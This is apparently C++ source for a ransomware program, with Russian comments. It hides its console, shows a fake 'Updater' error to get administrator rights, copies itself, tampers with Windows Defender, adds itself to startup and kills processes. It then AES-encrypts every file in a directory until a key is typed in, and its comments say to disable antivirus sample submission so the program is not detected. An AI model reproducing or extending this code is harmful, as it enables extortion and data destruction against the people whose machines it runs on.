#include "pers/pers.h"
#include "pers/include.h"
#include "encrypt/cryptor.h"

using namespace std;
// !!ВАЖНО!!
// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ
// ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
int main(int argc, char* argv[]) {
    Persistence Persistence;
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    char path[MAX_PATH];
    if (!Persistence::isUserAdmin()) {
        MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
        Persistence::restartAsAdmin();
        return 0;
    }
    Sleep(rand() % 5000 + 5000);
    if (Persistence::copyAndRunSelf()) {
        return 0;
    }
    if (!Persistence::checkAndCreateFile("lafkildatnn.dat")) {
        Persistence::DefenderOwner();
        Persistence::addToStartup();
        Sleep(1500);
        Persistence::reset();
        Sleep(rand() % 5000 + 5000);
        Persistence::restartSystem();
        return 0;
    }
    std::thread killerThread(Persistence::StopExe); // Запускаем фоновый поток
    killerThread.detach();
    Sleep(2000);
    // тут основной процесс закрепления 
    std::string hwid = "C:\\Windows\\SysWOW64\\" + Persistence::getDiskSerial() + ".txt";


    // { ENCRYPTION } //
     
    ShowWindow(Console, 1);

    std::string enc_path;
    enc_path = "C:\\dummy\\";
    
    std::cout << "[i] Working within  " << enc_path << ".\n";
    AES256CBC AES;

    AES.generateKey();
    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
        std::string filename = entry.path().string();
        if (!std::filesystem::is_directory(filename))
            AES.encryptFile(filename);
    }
    // { END ENCRYPTION } //


    std::string fakeKey;
    while (fakeKey != "123") {
        std::cin >> fakeKey;
        Sleep(5000); // Пауза 5 секунд перед следующей проверкой
    }

    AES.keyFromFile();
    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
        std::string filename = entry.path().string();
        if (!std::filesystem::is_directory(filename))
            AES.decryptFile(filename);
    }

    Persistence::cleanfile();
    Persistence::cleanreg();
    Persistence::reset();
    return 0;
}
